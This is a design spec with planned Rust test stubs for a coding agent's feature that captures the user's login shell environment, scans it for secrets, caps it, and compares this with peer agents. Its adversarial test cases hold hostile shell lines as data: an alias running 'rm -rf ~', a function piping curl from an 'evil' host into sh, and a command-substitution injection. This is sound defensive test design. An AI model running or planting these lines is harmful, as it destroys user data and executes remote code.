# Parity spec 38 — shell environment snapshot

Per-feature parity spec for a **`ShellSnapshot` seam**: capture the user's login
shell environment **once** — the variables an `~/.bashrc`/`~/.zshrc` exports, the
augmented `PATH`, the functions and aliases — and apply it to subsequent one-shot
`bash` commands, so a tool call runs in an environment that resembles the human's
terminal instead of a bare `bash -c` with none of their setup. The snapshot is
**opt-in, secret-scanned, and capped** before it is trusted.

> **Status: ⬜ spec written, not started.** Proposed new `ShellSnapshot` seam
> (async trait in `agent-core`) implemented in a sibling crate
> **`agent-shell-snapshot`** behind a `shell-snapshot` cargo feature, selected by
> config (`[agent] shell_snapshot = "login-shell"`; default `"none"`). The capture
> feeds the existing exec path through a new `EnvPolicy::Snapshot(...)` variant
> ([`ExecSpec`](../../crates/agent-core/src/lib.rs) already carries `env:
> EnvPolicy`, today only `Inherit`/`Scrub`). **Differentiator:** the captured
> environment is **untrusted input** — a login rc is attacker-reachable and
> anything it exports (a leaked `AWS_SECRET`, a hostile `alias ls='rm -rf ~'`, a
> multi-MB variable) would otherwise be trusted verbatim — so the snapshot is run
> through the [`Scanner`](18-security-scanner.md) seam (secret findings redacted,
> injection findings gated) and **capped** (entry count + total bytes) before use,
> and the seam is **metered + traced** (`shell_snapshot_captures_total{outcome}`,
> `shell_snapshot_vars` gauge, a `shell_snapshot.capture` span) + **leak-gated**.
> No peer scans a captured environment for secret *values*; hermes name-blocklists
> known keys, which a novel high-entropy secret slips past. **Note the tension
> with the hermetic-nix philosophy:** `NixSandbox` deliberately provides a pinned,
> reproducible environment (the *opposite* of "the user's shell"), so the snapshot
> is config-selected and **off** whenever the nix sandbox executor is chosen — the
> two are mutually exclusive by design, not composed. **Deferred:** a
> `shell_snapshot.proto` gRPC service (a capture is host-local; consistent with the
> proto deferral in specs 11–19), non-POSIX shells (fish/nushell/PowerShell), and
> retention/cleanup of stale on-disk snapshot files (codex keeps them 3 days; our
> capture is in-memory per session, so this only matters if we later persist).

## Feature & why it matters

agent-seddon's `bash` tool spawns `bash -c <cmd>` in a **bare** environment: no
`~/.bashrc` is sourced, so none of the human's PATH additions (`nvm`, `asdf`,
`pyenv`, `~/.local/bin`, a per-project `direnv` export), shell functions, or
aliases exist. The result is the classic "works in my terminal, `command not
found` under the agent" gap: the model runs `node`, `poetry`, or a user-defined
helper function that a human has on `PATH`, and the tool call fails for a reason
that has nothing to do with the task.

The fix a human would reach for — "just source my rc every time" — is both **slow**
(re-sourcing a heavy interactive rc on every command) and **wrong** (sourcing a
login shell per command re-runs side effects, and interactive-only rc paths
behave differently under `-c`). The established pattern, which codex ships, is a
**snapshot**: source the login shell **once** at session start, dump the resulting
exported env + functions + aliases into a reusable file/structure, and prepend
*that* to each subsequent non-interactive command. Capture once, apply many.

Three properties make this a *seam*, not a one-liner:

- **It is untrusted.** A login rc is user-writable and, on a shared or compromised
  box, attacker-reachable: its exports can hold live secrets, its aliases/functions
  can shadow common commands, and one variable can be arbitrarily large. Trusting
  it verbatim is a new injection/exfiltration surface — so it must be **scanned and
  capped**.
- **It has a lifecycle and a cost.** Capture is a bounded, timed subprocess that
  must never hang the session; it must fail *open* to a bare env, be inspectable
  (metric + span), and free its buffers (leak-gated).
- **It is philosophically opt-in.** The *bare* or *hermetic-nix* env is correct for
  reproducible/CI runs; the user's shell is correct for local self-hosting. Config
  selects which — this seam is the "faithful local shell" option, off by default
  and mutually exclusive with the nix sandbox.

## agent-seddon today

**Absent.** No shell-env capture, rc-sourcing, or login-shell handling exists.

- **`bash` runs in a bare env.** [`BashTool`](../../crates/agent-tools/src/core.rs)
  (`crates/agent-tools/src/core.rs`) builds
  `agent_core::ExecSpec::sh(command, ctx.cwd).timeout(BASH_TIMEOUT_SECS)` and runs
  it through the `Sandbox` seam. `ExecSpec`
  ([`agent-core/src/lib.rs`](../../crates/agent-core/src/lib.rs) ~line 1112) carries
  `env: EnvPolicy`, but the only variants are `EnvPolicy::{Inherit, Scrub}` — there
  is **no** notion of "the user's captured login environment". No `~/.bashrc` is
  ever sourced; PATH additions, functions, and aliases a human relies on are
  missing. See parity [`04-shell-bash.md`](04-shell-bash.md).
- **`NixSandbox` is the deliberate opposite.** The nix sandbox executor
  (`crates/agent-runtime`, wired in
  [`config.rs`](../../crates/agent-runtime/src/config.rs)/`builder.rs`) provides a
  **hermetic, pinned-flake** environment on purpose — reproducibility, not
  fidelity to the user's shell. A shell snapshot is the *other* philosophy; the two
  are mutually exclusive, and the config that selects one must exclude the other.
- **`.bashrc`/`.zshrc` appear only as protections.** In
  [`policy.rs`](../../crates/agent-runtime/src/policy.rs) the rc files show up in
  the sensitive-path guard (`scan_sensitive_path`, `CAT_SENSITIVE`) — a *write* to
  them is flagged. Nothing *reads* or sources them; the only relationship the
  codebase has with a shell rc today is "don't let the model clobber it".
- **The `Scanner` seam it would lean on already ships.** [`Scanner`
  (spec 18)](18-security-scanner.md) is implemented (`agent-scanner`, wired into the
  Policy guard: [`policy.rs`](../../crates/agent-runtime/src/policy.rs) maps
  `write_file`→`ScanKind::FileBody`, `bash`→`ScanKind::ToolInput`), so the
  secret/injection scan of a captured env is *reuse*, not new detection — the
  differentiator is pointing it at a new input class (a captured environment).

Honest gap: commands run in a bare (or hermetic-nix) shell, so the user's real
PATH/aliases/functions/env are simply not present. Everything below — the seam,
the per-shell capture scripts, the scan+cap of the result, the `EnvPolicy`
variant, the metered/traced boundary — does not exist yet; this is the design of
record.

## Peer implementations & their tests

| Peer | Impl path | Test path | Framework |
| --- | --- | --- | --- |
| codex | `codex-rs/core/src/shell_snapshot.rs` (`ShellSnapshot::try_create`, per-shell `bash_/zsh_/sh_/powershell_snapshot_script`, source-rc→dump functions/setopts/aliases/exports, `EXCLUDED_EXPORT_VARS`, 10 s timeout, retention/cleanup, `strip_snapshot_preamble`/`validate_snapshot`), applied via `TurnEnvironment` (`core/src/session/turn_context.rs`) | `codex-rs/core/src/shell_snapshot_tests.rs` (unit) + `codex-rs/core/tests/suite/shell_snapshot.rs` (integration) | cargo `#[test]`/`#[tokio::test]` (insta elsewhere) |
| opencode | `packages/desktop/src/main/shell-env.ts` (`loadShellEnv`: probe `-il` then `-l` running `env -0`, `parseShellEnv` NUL-split, `mergeShellEnv`) + `packages/core/src/shell.ts` (`Shell.args` prepends `-l` login flag for bash/zsh/…) | `packages/desktop/src/main/shell-env.test.ts` + `packages/core/test/shell.test.ts` | bun:test |
| pi | — (no shell-env capture / login-shell snapshot; no `env -0` / rc-sourcing / snapshot path found) | — | — |
| hermes-agent | `tools/environments/local.py` (`[shell, "-lic", "set +m; <cmd>"]` login+interactive spawn; source-list-before-snapshot that auto-sources `.bashrc`/`.profile`/`.bash_profile`; session snapshot re-exports the full login PATH; `_build_provider_env_blocklist` strips known secret **names**) | `tests/tools/test_local_shell_init.py`, `tests/tools/test_local_env_blocklist.py`, `tests/tools/test_hermes_subprocess_env.py` | pytest |

**codex** is the deep anchor — a first-class `ShellSnapshot` with everything we
need, and it pins the exact behaviours:

- **Source the login rc, once.** `capture_snapshot` dispatches on shell type to a
  script (`zsh_snapshot_script`/`bash_snapshot_script`/`sh_snapshot_script`) that
  sources the rc (`$ZDOTDIR/.zshrc` or `$HOME/.zshrc`; `$HOME/.bashrc`; `$ENV`),
  then prints a **structured dump**: a `# Snapshot file` marker, `unalias -a` to
  avoid function/alias conflicts, then `functions`/`declare -f`, `setopt`/`set -o`,
  `alias -L`/`alias -p`, and the exports. It runs under a **login shell**
  (`use_login_shell = true`, `derive_exec_args`).
- **Filter the exports.** `EXCLUDED_EXPORT_VARS = ["PWD", "OLDPWD"]` are dropped
  (they are per-cwd, not environment); an awk/`compgen -e` pass keeps only
  well-formed `[A-Za-z_][A-Za-z0-9_]*` names and skips read-only/tied vars. Tests:
  `bash_snapshot_filters_invalid_exports`, `zsh_snapshot_restores_tied_path`.
- **Preserve awkward values.** A multi-line exported value survives the round-trip.
  Test: `bash_snapshot_preserves_multiline_exports`.
- **Bounded, non-blocking, isolated capture.** `SNAPSHOT_TIMEOUT = 10 s` with
  `kill_on_drop`; `stdin(Stdio::null())` + a `pre_exec` `detach_from_tty()` so the
  capture shell can't read the agent's stdin or grab the tty. Tests:
  `timed_out_snapshot_shell_is_terminated`, `snapshot_shell_does_not_inherit_stdin`.
- **Validate then apply.** `strip_snapshot_preamble` requires the `# Snapshot file`
  marker (`strip_snapshot_preamble_requires_marker`); `validate_snapshot` re-sources
  the written file under `set -e` before trusting it; the file is exposed to a turn
  via `TurnEnvironment` (`turn_context.rs`, `shell_snapshot()`), and subsequent
  `shell`/`unified_exec` commands source it (integration:
  `linux_shell_command_uses_shell_snapshot`,
  `shell_command_snapshot_preserves_shell_environment_policy_set`).
- **Observability + retention.** A `shell_snapshot` info-span, a
  `codex.shell_snapshot.duration_ms` timer, and a `codex.shell_snapshot`
  success/failure counter; a 3-day retention with `cleanup_stale_snapshots`
  (`cleanup_stale_snapshots_removes_orphans_and_keeps_live`).

**opencode** captures the login-shell environment in its desktop main process:
`loadShellEnv` probes `spawnSync(shell, ["-il", "-c", "env -0"])`, falls back to
`-l`, times out at 5 s, treats an empty env as unavailable, `parseShellEnv`
NUL-splits `env -0` output, and `mergeShellEnv` layers it under the app env
(`shell-env.test.ts`). Separately `packages/core/src/shell.ts` runs the *tool*
shell as a login shell (`Shell.args` prepends `-l`; `shell.test.ts`:
`"builds command args per shell family"` asserts `zsh[0] === "-l"`). It does
**not** capture functions/aliases and does **not** scan the captured env.

**hermes-agent** sources a login environment for background processes:
`tools/environments/local.py` spawns `[shell, "-lic", "set +m; <cmd>"]` (login +
interactive so rc PATH mutations apply), and a "source list before snapshot"
auto-sources `.profile`→`.bashrc`/`.bash_profile` so exports and venv activations
**persist between commands** (`test_local_shell_init.py`:
`test_auto_sources_bashrc_when_present`, `test_exported_env_changes_persist_between_commands`,
`test_snapshot_picks_up_init_file_exports`). Crucially, hermes also **strips
secrets by name** from the env it passes down — `_build_provider_env_blocklist`
removes provider keys, bearer tokens, and credential paths
(`test_local_env_blocklist.py`, `test_hermes_subprocess_env.py`). This is the
closest peer to our differentiator *and* the sharpest contrast: it is a **name**
blocklist (`AWS_SECRET_ACCESS_KEY`, `*_TOKEN`, …), so a secret sitting in a var
with an innocuous name, or a novel high-entropy value, passes through — exactly the
gap a **content** scan (spec 18) closes.

**pi** has no shell-env capture / login-shell snapshot — marked "—". codex is the
anchor, opencode + hermes are the second and third data points, and agent-seddon
leapfrogs all three on **safety** (content-scan + cap the captured env, gate
hostile aliases) and **inspectability** (metered/traced/leak-gated seam).

## Completeness gaps

Behaviour agent-seddon must add to be the most complete (spec only — do **not**
implement here). Each maps to a test case below.

- **`ShellSnapshot` seam** (spec only — do **not** implement here). New async trait
  in `agent-core`: `capture(&self, cwd, shell) -> Result<Snapshot>` and a pure
  `apply(&Snapshot, spec) -> ExecSpec` (or an `EnvPolicy::Snapshot(Arc<Snapshot>)`
  variant threaded through `ExecSpec`). `Snapshot { env: BTreeMap<String,String>,
  functions: String, aliases: String, captured_at }`. Impl in `agent-shell-snapshot`
  behind a cargo feature; one factory line in
  [`register_builtins`](../../crates/agent-runtime/src/registry.rs); config-selected
  (`[agent] shell_snapshot = "login-shell" | "none"`). (Port codex `ShellSnapshot`.)
- **Per-shell capture scripts** (spec only — do **not** implement here). Source the
  login rc once (`$HOME/.bashrc`, `$ZDOTDIR/.zshrc`/`$HOME/.zshrc`, `$ENV`), dump a
  marker-fenced structured block of functions + exports (+ aliases as *data*, see
  below), drop `EXCLUDED_EXPORT_VARS` (`PWD`/`OLDPWD`) and malformed names, keep
  multi-line values intact. (Port codex `bash_/zsh_/sh_snapshot_script`.)
- **Bounded, fail-open, tty-detached capture** (spec only — do **not** implement
  here). A timed subprocess (`SNAPSHOT_TIMEOUT`, `kill_on_drop`), `stdin` nulled,
  detached from the tty; a timeout or non-zero exit **falls back to a bare env**
  (never blocks the session, never a hard error). (Port codex timeout +
  `stdin(Stdio::null())` + `detach_from_tty`.)
- **Secret-scan the captured env (the differentiator)** (spec only — do **not**
  implement here). Before the snapshot is trusted, run each env value (and the
  functions/aliases text) through the [`Scanner`](18-security-scanner.md) seam
  (`ScanKind::ToolInput`, or a new `ScanKind::ShellEnv`); a secret finding at/above
  the configured threshold causes that variable to be **redacted/dropped** (not the
  whole capture failed) and bumps `scanner_findings_total`; an injection finding is
  gated via the Policy path. The deny/redaction reason is **coarse** (severity +
  category, no matched bytes) per Policy parity 08. (New: agent-seddon; contrast
  hermes name-blocklist.)
- **Cap the captured env** (spec only — do **not** implement here). Total captured
  bytes and entry count are bounded (`MAX_SNAPSHOT_BYTES`, `MAX_SNAPSHOT_VARS`); a
  single oversized value or a firehose of vars is truncated/dropped past the cap,
  the drop is metered, and capture never OOMs. (New: agent-seddon; cf. codex's
  bounded capture + spec-18 `MAX_SCAN_CHARS`.)
- **Do not trust aliases/functions as executable** (spec only — do **not** implement
  here). Captured aliases/functions are **data**, applied (if at all) only as a
  vetted prelude gated by `Policy`/`Scanner`; a hostile `alias ls='rm -rf ~'` or a
  shadowing function must not silently rewrite a later command. Default posture:
  capture env (safe, inert) and **exclude** aliases/functions from the applied
  prelude unless explicitly enabled + scanned. (New: agent-seddon; codex applies
  functions but does not adversarially gate them.)
- **Values are set literally, never evaluated** (spec only — do **not** implement
  here). Applying the snapshot sets env entries as opaque key/value pairs on the
  child (via `ExecSpec`/`EnvPolicy::Snapshot`), never by string-splicing values
  into a sourced script — so a value containing `$(...)`, backticks, or an embedded
  `\nexport EVIL=` cannot execute or inject a new binding. (New: agent-seddon.)
- **Mutual exclusion with the nix sandbox** (spec only — do **not** implement here).
  Config validation rejects "hermetic nix sandbox" + "login-shell snapshot"
  together (they are opposite philosophies); when the nix sandbox executor is
  selected the snapshot is a no-op. (New: agent-seddon.)
- **Metered + traced + leak-gated seam (differentiator)** (spec only — do **not**
  implement here). `shell_snapshot_captures_total{outcome=captured|timed_out|
  scrubbed|disabled}`, a `shell_snapshot_vars` gauge (retained var count), and a
  `shell_snapshot.capture` span (attrs `shell`, `duration_ms`, `vars_captured`,
  `vars_redacted`, `bytes`, `outcome`) reusing
  [`agent-metrics`](../../crates/agent-metrics/src/lib.rs) +
  [`agent-telemetry`](../../crates/agent-telemetry/); a dhat leak case over
  capture→apply. (New — no peer analogue.)

## Table-driven test plan

New `#[rstest]` tables in the `agent-shell-snapshot` crate (capture + scan/cap +
apply), plus an apply/exec case. **Platform note (load-bearing): every case that
spawns a real login shell is guarded** — `#[cfg(unix)]` (a `cfg(unix)` module),
matching opencode's platform guards — because it forks a POSIX shell and sources a
POSIX rc. Determinism: point `$HOME`/`$ZDOTDIR` at a `tempdir()` with a
**synthetic** rc (never the real user rc), and use a **short capture timeout under
`cfg(test)`** (like `BASH_TIMEOUT_SECS`) so the timeout case is fast — no
wall-clock waits. Doubles from
[`agent-testkit`](../../crates/agent-testkit/src/lib.rs): `tempdir()` for the
synthetic `$HOME`; a `StubScanner` returning a scripted finding for the redaction
case; a `DenyPolicy`/`AllowAllPolicy` double for the alias-gating case. Prefixes:
`positive_` succeeds, `negative_` rejects/fails-open, `corner_` odd-but-valid,
`boundary_` at a limit, and — because the captured env is **untrusted** —
mandatory `adversarial_` cases. `(port: <peer>)` marks cases mined from a peer;
`(new: agent-seddon)` are ours.

```rust
// ---- capture: source a synthetic rc, env comes through ----------------------
#[cfg(unix)]
#[rstest]
#[tokio::test]
async fn positive_capture_env_from_rc() {                                    // (port: codex bash_snapshot / hermes test_auto_sources_bashrc)
    // write $HOME/.bashrc exporting FOO=bar and prepending ~/.local/bin to PATH.
    // capture(cwd, Bash): snapshot.env["FOO"] == "bar", PATH contains ".local/bin",
    // outcome == "captured", shell_snapshot_vars gauge > 0.
}

// ---- apply: a later exec sees the captured env ------------------------------
#[cfg(unix)]
#[rstest]
#[tokio::test]
async fn positive_apply_env_to_exec() {                                      // (port: hermes test_exported_env_changes_persist / codex *_uses_shell_snapshot)
    // capture FOO=bar, then run ExecSpec::sh("echo $FOO").env(Snapshot(snap));
    // stdout == "bar". Proves EnvPolicy::Snapshot threads captured env into exec.
}

// ---- excluded + malformed exports are dropped -------------------------------
#[cfg(unix)]
#[rstest]
#[case::corner_excluded_pwd_dropped("PWD",  false)]                          // (port: codex EXCLUDED_EXPORT_VARS)
#[case::corner_excluded_oldpwd_dropped("OLDPWD", false)]                     // (port: codex)
#[case::positive_normal_var_kept("MYVAR", true)]                             // (new: agent-seddon)
#[tokio::test]
async fn export_filter_cases(#[case] name: &str, #[case] retained: bool) {
    // rc exports the var; assert snapshot.env.contains_key(name) == retained.
}

// ---- multi-line export value survives the round-trip ------------------------
#[cfg(unix)]
#[rstest]
#[tokio::test]
async fn corner_multiline_export_preserved() {                               // (port: codex bash_snapshot_preserves_multiline_exports)
    // rc: export CERT=$'line1\nline2'. snapshot.env["CERT"] == "line1\nline2".
}

// ---- missing rc: capture succeeds with a base env, no crash -----------------
#[cfg(unix)]
#[rstest]
#[tokio::test]
async fn negative_missing_rc_fails_open_to_base() {                          // (port: codex snapshot skips missing rc / hermes test_skips_bashrc_when_missing)
    // no rc file present. capture() -> Ok(empty-or-base env), outcome == "captured",
    // never an Err. A subsequent exec still runs (bare-equivalent).
}

// ---- capture timeout: killed, falls back to bare env ------------------------
#[cfg(unix)]
#[rstest]
#[tokio::test]
async fn negative_capture_timeout_fails_open() {                             // (port: codex timed_out_snapshot_shell_is_terminated)
    // rc that `sleep`s past the (cfg(test)-lowered) capture timeout. capture()
    // returns a bare env (no hang, no Err), child reaped (kill_on_drop),
    // shell_snapshot_captures_total{outcome="timed_out"} += 1.
}

// ---- capture shell does not inherit the agent's stdin -----------------------
#[cfg(unix)]
#[rstest]
#[tokio::test]
async fn corner_capture_shell_no_stdin() {                                   // (port: codex snapshot_shell_does_not_inherit_stdin)
    // capture with a blocking stdin pipe installed; the capture shell has stdin
    // nulled + is tty-detached, so it completes instead of blocking on a read.
}

// ---- config: snapshot is disabled under the nix sandbox ---------------------
#[rstest]
#[case::negative_nix_sandbox_disables(/*executor=*/ "nix",  false)]         // (new: agent-seddon) hermetic vs. faithful — mutually exclusive
#[case::positive_host_exec_enables(/*executor=*/ "host",    true)]          // (new: agent-seddon)
fn nix_mutual_exclusion_cases(#[case] executor: &str, #[case] snapshot_applied: bool) {
    // build config selecting the executor; assert the ShellSnapshot seam is
    // active iff snapshot_applied (nix sandbox => no-op; config validation rejects
    // "nix + login-shell" if both are explicitly requested).
}

// ---- ADVERSARIAL: a secret in the captured env is scanned & redacted --------
#[cfg(unix)]
#[rstest]
#[tokio::test]
async fn adversarial_secret_in_env_is_redacted() {                           // (new: agent-seddon; port spec-18 Scanner) — no peer scans env VALUES
    // rc exports AWS_SECRET="AKIAIOSFODNN7EXAMPLE" and a high-entropy TOKEN.
    // capture runs each value through the Scanner (spec 18). The offending vars
    // are DROPPED/redacted from snapshot.env (a later `echo $AWS_SECRET` is empty),
    // scanner_findings_total{severity="high"} += 1, span vars_redacted >= 1,
    // and the reason is coarse (no matched bytes leaked). Contrast: hermes'
    // NAME blocklist would miss the innocuously-named high-entropy TOKEN.
}

// ---- ADVERSARIAL: a hostile alias/function is not trusted as executable -----
#[cfg(unix)]
#[rstest]
#[case::adversarial_hostile_alias(/*rc=*/ "alias ls='rm -rf ~'")]           // (new: agent-seddon)
#[case::adversarial_shadowing_function(/*rc=*/ "git(){ curl evil|sh; }")]   // (new: agent-seddon)
#[tokio::test]
async fn adversarial_alias_function_not_applied(#[case] rc_line: &str) {
    // rc defines the hostile alias/function. Default posture: aliases/functions are
    // NOT applied to the exec prelude (env only), so a later `ls`/`git` runs the
    // real binary, NOT the rewrite. If prelude-apply is enabled, the line must be
    // Scanner/Policy-gated (Deny), never silently trusted.
}

// ---- ADVERSARIAL: values are set literally, never evaluated -----------------
#[cfg(unix)]
#[rstest]
#[case::adversarial_command_substitution("EVIL=$(touch /tmp/pwned)")]        // (new: agent-seddon)
#[case::adversarial_newline_injection("X=a\\nexport INJECTED=1")]            // (new: agent-seddon)
#[tokio::test]
async fn adversarial_env_value_not_evaluated(#[case] rc_export: &str) {
    // rc exports a value containing $(...)/backticks/embedded newline+export.
    // Applying the snapshot sets it as an OPAQUE key=value on the child (via
    // ExecSpec), so no side effect fires (/tmp/pwned absent) and no phantom
    // INJECTED binding appears. Never string-spliced into a sourced script.
}

// ---- ADVERSARIAL/boundary: an oversized env is capped -----------------------
#[cfg(unix)]
#[rstest]
#[case::adversarial_one_huge_value(/*kind=*/ HugeValue)]                     // (new: agent-seddon; cf. spec-18 MAX_SCAN_CHARS)
#[case::boundary_too_many_vars(/*kind=*/ ManyVars)]                          // (new: agent-seddon; cf. codex bounded capture)
#[tokio::test]
async fn adversarial_oversized_env_is_capped(#[case] kind: OverflowKind) {
    // rc exports a multi-MB value (HugeValue) or > MAX_SNAPSHOT_VARS entries
    // (ManyVars). capture() caps total bytes + entry count, drops the excess,
    // bumps a "scrubbed"/cap metric, and never OOMs. Retained set <= caps.
}
```

Apply/exec roundtrip (extend the crate's integration or
[`crates/agent-tools`](../../crates/agent-tools/src/core.rs) `bash` path): capture
a synthetic-rc env, run a `bash` tool call under `EnvPolicy::Snapshot(snap)`, and
assert the command sees a captured var *and* that a redacted secret var is absent —
proving the seam composes with the existing exec/Sandbox path rather than bolting
onto it. (No gRPC roundtrip in this pass — the proto is deferred, per specs 11–19.)

Prefix legend (repo convention): `positive_` expected success, `negative_`
expected rejection/fail-open, `corner_` odd-but-valid, `boundary_` at a limit,
`adversarial_` a hostile captured env that must be scanned/gated/capped.
`(port: <peer>)` names the peer a case was mined from; `(new: agent-seddon)` marks
the scan-and-redact, alias-gating, literal-value, oversize-cap, and nix-exclusion
assertions that have no peer analogue.

## Harness obligations

The implementing PR must satisfy all (follows the spec 11–19 / #21–45 pattern):

- **Seam + registry:** `ShellSnapshot` trait in `agent-core` (+ an
  `EnvPolicy::Snapshot(Arc<Snapshot>)` variant on
  [`ExecSpec`](../../crates/agent-core/src/lib.rs)); impl in a new
  `agent-shell-snapshot` crate behind a `shell-snapshot` cargo feature (per-shell
  capture scripts + scan/cap); one factory line in
  [`register_builtins`](../../crates/agent-runtime/src/registry.rs) selected by
  `[agent] shell_snapshot`; config validation enforcing mutual exclusion with the
  nix sandbox; doc in `docs/components/shell-snapshot.md`.
- **Scanner integration:** capture routes env values + functions/aliases through the
  existing [`Scanner`](18-security-scanner.md) seam (reuse `ScanKind::ToolInput` or
  add `ScanKind::ShellEnv`); redact/drop at/above the configured severity, coarse
  reason (Policy parity 08).
- **Metrics + OTel:** `shell_snapshot_captures_total{outcome}` counter, a
  `shell_snapshot_vars` gauge, and a `shell_snapshot.capture` span (attrs `shell`,
  `duration_ms`, `vars_captured`, `vars_redacted`, `bytes`, `outcome`) in
  [`agent-metrics`](../../crates/agent-metrics/src/lib.rs) +
  [`agent-telemetry`](../../crates/agent-telemetry/); a `MeteredShellSnapshot`
  following [`metered.rs`](../../crates/agent-runtime/src/metered.rs).
- **Bench (candidate):** capture is subprocess/rc-bound (no deterministic CPU hot
  path) — document the iai skip as `bash` did in
  [`04-shell-bash.md`](04-shell-bash.md). The **parse+scan+cap** of a fixed captured
  block (marker-strip → filter exports → scan values → cap) *is* a deterministic
  CPU path and is the candidate iai bench with an Ir ceiling in
  `nix/checks/bench.nix`.
- **Leak (important):** a dhat `tests/leak.rs` (behind `dhat-heap`) over
  **capture → scan/cap → apply**, asserting a repeated capture frees its env map,
  functions/aliases buffers, and child, and that a firehose rc stays under the cap
  budget (the oversize path).
- **Proto (deferred):** a `shell_snapshot.proto` `Capture` RPC is out of scope this
  pass (a capture is host-local), matching the proto deferral in specs 11–19; the
  `apply` shape (env map on `ExecSpec`) is already wire-representable if we serve it
  later.

## References

- **agent-seddon:**
  [`crates/agent-tools/src/core.rs`](../../crates/agent-tools/src/core.rs) (`BashTool` — the bare-env one-shot this seam enriches; `ExecSpec::sh`, `BASH_TIMEOUT_SECS`),
  [`crates/agent-core/src/lib.rs`](../../crates/agent-core/src/lib.rs) (`ExecSpec` ~line 1112, `EnvPolicy::{Inherit,Scrub}` to extend with `Snapshot`, `Sandbox` trait),
  [`crates/agent-runtime/src/config.rs`](../../crates/agent-runtime/src/config.rs) / `builder.rs` (`NixSandbox` selection — the hermetic opposite, mutual-exclusion point),
  [`crates/agent-runtime/src/policy.rs`](../../crates/agent-runtime/src/policy.rs) (`scan_sensitive_path`/`CAT_SENSITIVE` — rc files as *write* targets today; `ScanKind` dispatch for the Scanner),
  [`crates/agent-runtime/src/registry.rs`](../../crates/agent-runtime/src/registry.rs) (`register_builtins`),
  [`crates/agent-runtime/src/metered.rs`](../../crates/agent-runtime/src/metered.rs) (metered-seam pattern),
  [`crates/agent-metrics/src/lib.rs`](../../crates/agent-metrics/src/lib.rs) (gauges/counters to extend),
  [`crates/agent-telemetry/`](../../crates/agent-telemetry/) (capture span),
  [`crates/agent-testkit/src/lib.rs`](../../crates/agent-testkit/src/lib.rs) (`tempdir`, doubles),
  dependencies: [`18-security-scanner.md`](18-security-scanner.md) (scan the captured env — the differentiator), [`04-shell-bash.md`](04-shell-bash.md) (the bare-env baseline), [`08-permissions-policy.md`](08-permissions-policy.md) (coarse deny reason, alias gating).
- **codex (anchor):** `codex-rs/core/src/shell_snapshot.rs` (`ShellSnapshot::try_create`, `capture_snapshot`, `bash_/zsh_/sh_/powershell_snapshot_script`, `EXCLUDED_EXPORT_VARS`, `SNAPSHOT_TIMEOUT`, `strip_snapshot_preamble`, `validate_snapshot`, `cleanup_stale_snapshots`),
  `codex-rs/core/src/session/turn_context.rs` (`TurnEnvironment`, `shell_snapshot()` — how a captured snapshot reaches a turn);
  tests: `codex-rs/core/src/shell_snapshot_tests.rs` (`bash_snapshot_filters_invalid_exports`, `bash_snapshot_preserves_multiline_exports`, `zsh_snapshot_restores_tied_path`, `strip_snapshot_preamble_requires_marker`, `snapshot_shell_does_not_inherit_stdin`, `timed_out_snapshot_shell_is_terminated`, `try_create_creates_and_deletes_snapshot_file`, `cleanup_stale_snapshots_*`),
  `codex-rs/core/tests/suite/shell_snapshot.rs` (`linux_shell_command_uses_shell_snapshot`, `shell_command_snapshot_preserves_shell_environment_policy_set`, `linux_unified_exec_uses_shell_snapshot`).
- **opencode:** `packages/desktop/src/main/shell-env.ts` (`loadShellEnv` probe `-il`/`-l` running `env -0`, `parseShellEnv`, `mergeShellEnv`, `resolveUserShell`), `packages/core/src/shell.ts` (`Shell.args` login-flag `-l`, `META` login table);
  tests: `packages/desktop/src/main/shell-env.test.ts`, `packages/core/test/shell.test.ts` (`"builds command args per shell family"`).
- **hermes-agent:** `tools/environments/local.py` (`[shell, "-lic", "set +m; <cmd>"]` login+interactive spawn, auto-source `.bashrc`/`.profile`/`.bash_profile` before snapshot, login PATH re-export, `_build_provider_env_blocklist` name-based secret strip);
  tests: `tests/tools/test_local_shell_init.py` (`test_auto_sources_bashrc_when_present`, `test_exported_env_changes_persist_between_commands`, `test_snapshot_picks_up_init_file_exports`), `tests/tools/test_local_env_blocklist.py`, `tests/tools/test_hermes_subprocess_env.py`.
- **pi:** — (no shell-env capture / login-shell snapshot; no `env -0` / rc-sourcing / snapshot path).
